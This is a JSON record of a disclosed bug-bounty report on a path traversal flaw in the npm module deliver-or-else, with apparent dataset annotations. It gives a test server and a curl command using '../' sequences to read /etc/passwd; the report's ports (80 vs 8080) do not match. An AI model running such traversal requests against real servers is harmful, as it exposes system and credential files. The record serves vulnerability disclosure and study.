{
  "reported_to": "Node.js third-party modules",
  "reported_by": "johnssimon007 ",
  "title": "[deliver-or-else] Path Traversal",
  "content": "\nI would like to report path traversal in deliver-or-else module\nIt allows an attacker to read system files via path traversal through commandline\nModule\nmodule name: deliver-or-else\nversion: 1.0.0\nnpm page: https://www.npmjs.com/package/deliver-or-else\nModule Description\nCopy description from npm page\nVulnerability\nVulnerability Description\nDirectory traversal through the url which doesn't verify the file is from the root directory path.\nSteps To Reproduce:\n1.npm i deliver-or-else\n2.now create a node.js(test.js) file for starting up a localserver on port 80,which will serve the file on the directory(public) over the web browser depending on the file requested by user through url\nhere is code for test.js\nconst Deliver = require('deliver-or-else')\nconst path = require('path')\n// It is up to you to resolve the document root directory\nconst http = require('http')\nlet deliver = new Deliver(path.join(__dirname, 'public'))\nlet server = http.createServer((req, res) => {\n/**\nThe deliver method returns a Promise, which in turn can be used to\ncatch any errors (such as a 404). We could also provide a then clause\nfor when it works successfully and a file has been delivered. */ deliver.deliver(req, res).catch((err) => { // The err contains information regarding how the fs.readFile failed res.statusCode = 404 res.setHeader('Content-Type', 'text/plain') res.end('404, no such file.') }) })\nserver.listen(80, '127.0.0.1', function () {\nconsole.log('Starting server...')\n})\n3.run below command\nnode test.js\nthis will startup the server at port 80\n4.trying to fetch a file outside of \"public\" dir is exempted and shows 404 error\n5.this can be bypassed by using curl via commandline by running below command\ncurl -v --path-as-is http://127.0.0.1:8080/node_modules/../../../../../etc/passwd\nwhich will return the passwd directory contents\nWrap up\nSelect Y or N for the following statements:\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nHunter's comments and funny memes goes here\nImpact\nThis vulnerability allows malicious user to read content of any file on the server, which leads to data breach or other attacks.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Path Traversal"
  ],
  "screenshots": {},
  "disclosed_date": 1580333160,
  "report_url": "https://hackerone.com/reports/507310",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Install the 'deliver-or-else' module using npm: npm i deliver-or-else"
    ],
    [
      2,
      "Create a Node.js file (test.js) to set up a local server that serves files from a 'public' directory"
    ],
    [
      3,
      "Run the server: node test.js"
    ],
    [
      4,
      "Use curl to exploit the path traversal vulnerability: curl -v --path-as-is http://127.0.0.1:8080/node_modules/../../../../../etc/passwd"
    ]
  ],
  "vuln_description": "The 'deliver-or-else' module is vulnerable to path traversal, allowing an attacker to read system files outside the intended 'public' directory by manipulating the URL path.",
  "reason": "The vulnerability involves a straightforward path traversal attack, which is a well-known and common type of vulnerability. The steps to reproduce are simple and do not require complex interactions or understanding of multiple components.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}